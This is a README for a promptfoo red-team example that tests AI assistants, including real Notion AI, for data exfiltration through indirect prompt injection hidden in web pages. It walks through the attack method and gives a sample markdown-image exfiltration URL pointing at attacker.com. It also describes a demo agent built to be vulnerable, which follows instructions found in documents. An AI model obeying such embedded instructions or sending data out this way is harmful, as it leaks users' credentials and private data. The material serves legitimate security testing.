# redteam-indirect-web-pwn (Red Team Data Exfiltration via Indirect Web Prompt Injection)

You can run this example with:

```bash
npx promptfoo@latest init --example redteam-indirect-web-pwn
cd redteam-indirect-web-pwn
```

## Introduction

This example demonstrates how to test AI assistants for **data exfiltration vulnerabilities** using promptfoo's [indirect-web-pwn](https://www.promptfoo.dev/docs/red-team/strategies/indirect-web-pwn/) strategy.

The attack works by:

1. Creating a web page with hidden prompt injection instructions
2. Asking the AI assistant to fetch and summarize the page
3. The injected instructions attempt to trick the model into encoding sensitive data into URL query parameters (e.g., markdown images like `![img](http://attacker.com/exfil?api=SECRET)`)

## Scenarios

This example includes **4 attack scenarios** against different AI targets, all using the same promptfoo red team configuration:

| # | Scenario | Provider | Target | Prerequisites |
|---|----------|----------|--------|---------------|
| 1 | **OpenAI Direct** | `provider-openai.js` | GPT-4.1 with `web_fetch` tool | `OPENAI_API_KEY` |
| 2 | **Notion AI HTTP** | `provider-notion-http.js` | Real Notion AI via HTTP API | `notion-state.json` |
| 3 | **Notion AI Browser** | `provider-notion-browser.js` | Real Notion AI via Playwright | `notion-state.json` + Playwright |
| 4 | **Notion Demo App** | `provider-notion-app.js` | Local Notion clone via Playwright | Running app + `OPENAI_API_KEY` + Playwright |

## Quick Start

> **Important:** All commands below should be run from this example directory (`examples/redteam-indirect-web-pwn/`).

### Scenario 1: OpenAI (simplest)

```bash
npm install
export OPENAI_API_KEY=your-key-here
npm run redteam:openai
```

### Scenario 2 & 3: Notion AI (HTTP / Browser)

```bash
npm install
npx playwright install chromium
npm run setup:notion              # Opens browser → log into Notion → press Enter
npm run redteam:notion-http       # Test via HTTP API
npm run redteam:notion-browser    # Test via browser automation
```

### Scenario 4: Notion Demo App

```bash
npm install
npx playwright install chromium
npm run notion-app:install        # Install app dependencies

# Terminal 1: Start the app
export OPENAI_API_KEY=your-key-here
cp .env.example notion-app/server/.env
# Edit notion-app/server/.env with your OPENAI_API_KEY
npm run notion-app

# Terminal 2: Run the red team
export OPENAI_API_KEY=your-key-here
npm run redteam:notion-app
```

### Run All Scenarios

```bash
npm run redteam:openai
npm run redteam:notion-http
npm run redteam:notion-browser
npm run redteam:notion-app
```

### View Results

```bash
npm run view
```

## What to Look For

- **FAIL** results indicate the model attempted to exfiltrate data by embedding values in URL query parameters or markdown images
- **PASS** results indicate the model refused the injection or did not attempt exfiltration

## How Each Provider Works

### provider-openai.js

Gives GPT-4.1 a `web_fetch` tool that actually fetches URLs. The `indirect-web-pwn` strategy creates a page with a hidden injection, then asks the model to fetch and summarize it.

### provider-notion-http.js

Makes direct HTTP requests to Notion's AI inference API (`/api/v3/runInferenceTranscript`) using saved authentication cookies. No browser needed.

### provider-notion-browser.js

Uses Playwright to open Notion AI in a real browser, type messages into the chat interface, and extract responses from the DOM.

### provider-notion-app.js

Uses Playwright to interact with the local Notion clone (`notion-app/`). This demo app includes an intentionally vulnerable AI agent with tools for searching, reading, and updating documents, plus seed data containing fake sensitive credentials.

## Notion Demo App

The `notion-app/` directory contains a Notion-like workspace with:

- **In-memory document store** with seed data (fake API keys, salary data)
- **AI assistant** (GPT-4o) with 5 tools: `search_docs`, `read_doc`, `update_doc`, `create_doc`, `web_fetch`
- **Intentionally permissive system prompt** that tells the AI to follow instructions found in documents
- **Auto-save** that persists AI-generated content before user approval
- **Markdown renderer** that fetches any image URL (the exfiltration trigger)

The app resets on restart (in-memory storage). Use `POST /api/documents/reset` to reset seed data without restarting.
